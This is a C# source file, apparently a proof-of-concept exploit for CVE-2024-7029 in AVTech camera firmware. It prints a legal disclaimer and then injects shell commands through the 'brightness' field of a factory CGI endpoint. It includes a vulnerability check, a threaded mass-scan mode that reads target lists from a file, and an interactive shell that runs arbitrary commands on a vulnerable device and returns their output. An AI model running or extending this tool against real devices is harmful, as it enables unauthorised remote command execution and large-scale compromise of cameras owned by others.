using System;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Threading;

namespace PocCVE20247029
{
    class Program
    {
        private static readonly string path = "/cgi-bin/supervisor/Factory.cgi";
        private static readonly HttpClient client = new HttpClient();

        static async Task Main(string[] args)
        {
            DisplayDisclaimer();

            Console.Write("Do you agree with the disclaimer? (y/n): ");
            if (Console.ReadLine()?.ToLower() != "y")
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("You must agree to the disclaimer to proceed.");
                Console.ResetColor();
                Console.ReadLine();
                return;
            }

            DisplayBanner();

            string url = null;
            string file = null;
            int threads = 10;

            // Check if arguments were provided, otherwise ask the user
            if (args.Length == 0)
            {
                Console.Write("Please enter the target URL (leave empty to use a file): ");
                url = Console.ReadLine();

                if (string.IsNullOrEmpty(url))
                {
                    Console.Write("Please enter the path to the file containing target URLs: ");
                    file = Console.ReadLine();
                }

                Console.Write("Enter the number of threads to use (default is 10): ");
                var threadsInput = Console.ReadLine();
                if (!string.IsNullOrEmpty(threadsInput) && int.TryParse(threadsInput, out int t))
                {
                    threads = t;
                }
            }
            else
            {
                foreach (var arg in args)
                {
                    if (arg.StartsWith("-u="))
                    {
                        url = arg.Substring(3);
                    }
                    else if (arg.StartsWith("-f="))
                    {
                        file = arg.Substring(3);
                    }
                    else if (arg.StartsWith("-t="))
                    {
                        if (int.TryParse(arg.Substring(3), out int t))
                        {
                            threads = t;
                        }
                    }
                }
            }

            // Check if the URL or file was provided either via arguments or user input
            if (!string.IsNullOrEmpty(url))
            {
                var exploit = new AvTechExploit(url, threads);
                await exploit.Scanner();
                await exploit.InteractiveShell(); // Shell interactive  
            }
            else if (!string.IsNullOrEmpty(file))
            {
                var exploit = new AvTechExploit(null, file, threads);
                await exploit.ScanFile();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] No target URL or file was specified.");
                Console.ResetColor();
                ShowHelp();
            }
        }

        private static void DisplayDisclaimer()
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("============================================");
            Console.WriteLine(" DISCLAIMER: ");
            Console.WriteLine(" POC: Abdal CVE-2024-7029 by EbraSha");
            Console.WriteLine(" This Proof of Concept (PoC) is for educational purposes only.");
            Console.WriteLine(" Unauthorized use of this software on systems you do not own or");
            Console.WriteLine(" have explicit permission to test is illegal and unethical.");
            Console.WriteLine(" Users must comply with all applicable laws and regulations.");
            Console.WriteLine(" The developer assumes no responsibility for misuse or damage.");
            Console.WriteLine("============================================");
            Console.ResetColor();
            Console.WriteLine();
        }

        private static void DisplayBanner()
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("============================================");
            Console.WriteLine("         Abdal CVE-2024-7029 Ver 1.0       ");
            Console.WriteLine("         PoC: Ebrahim Shafiei (EbraSha)      ");
            Console.WriteLine("         Telegram: https://t.me/ProfShafiei  ");
            Console.WriteLine("         Email: Prof.Shafiei@gmail.com       ");
            Console.WriteLine("         Vulnerability ID: CVE-2024-7029    ");
            Console.WriteLine("============================================");
            Console.ResetColor();
            Console.WriteLine();
        }

        private static void ShowHelp()
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("Usage:");
            Console.WriteLine("  -u=<url>       Target URL to exploit");
            Console.WriteLine("  -f=<file>      File containing target URLs");
            Console.WriteLine("  -t=<threads>   Number of threads for scanning (default 10)");
            Console.ResetColor();
        }

        public class AvTechExploit
        {
            private readonly string target;
            private readonly string targetFile;
            private readonly int threads;

            public AvTechExploit(string target, int threads)
            {
                this.target = target;
                this.threads = threads;
            }

            public AvTechExploit(string target, string targetFile, int threads)
            {
                this.targetFile = targetFile;
                this.threads = threads;
            }

            public async Task Scanner()
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[*] Checking if the target is vulnerable");
                Console.ResetColor();
                await CheckVuln(target);
            }

            public async Task ScanFile()
            {
                try
                {
                    var targets = await File.ReadAllLinesAsync(targetFile);
                    using var semaphore = new SemaphoreSlim(threads);

                    var tasks = new List<Task>();
                    foreach (var target in targets)
                    {
                        await semaphore.WaitAsync();
                        tasks.Add(Task.Run(async () =>
                        {
                            await CheckVuln(target);
                            semaphore.Release();
                        }));
                    }

                    await Task.WhenAll(tasks);
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] Error scanning from file: {ex.Message}");
                    Console.ResetColor();
                }
            }

            private async Task CheckVuln(string target)
            {
                try
                {
                    var test = "action=white_led&brightness=$(echo%20GDHAiwhsHWhswHSKA 2>&1) #";
                    var content = new StringContent(test, System.Text.Encoding.UTF8,
                        "application/x-www-form-urlencoded");

                    var response = await client.PostAsync(target + path, content);
                    var responseText = await response.Content.ReadAsStringAsync();

                    if (responseText.Contains("GDHAiwhsHWhswHSKA"))
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"[+] The target is vulnerable: {target}");
                        Console.ResetColor();
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"[-] The target is not vulnerable: {target}");
                        Console.ResetColor();
                    }
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] Error checking target {target}: {ex.Message}");
                    Console.ResetColor();
                }
            }

            public async Task Exploit(string cmd)
            {
                var data = $"action=white_led&brightness=$({cmd} 2>&1) #";
                var content = new StringContent(data, System.Text.Encoding.UTF8, "application/x-www-form-urlencoded");

                try
                {
                    var response = await client.PostAsync(target + path, content);
                    var responseText = await response.Content.ReadAsStringAsync();
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] Command output: {responseText}");
                    Console.ResetColor();
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] Error during exploitation: {ex.Message}");
                    Console.ResetColor();
                }
            }

            public async Task InteractiveShell()
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.WriteLine("[*] Initiating interactive shell. Type 'exit' to quit.");
                Console.ResetColor();
                while (true)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write("Shell> ");
                    Console.ResetColor();
                    var cmd = Console.ReadLine();
                    if (cmd.ToLower() == "exit") break;
                    await Exploit(cmd);
                }
            }
        }
    }
}
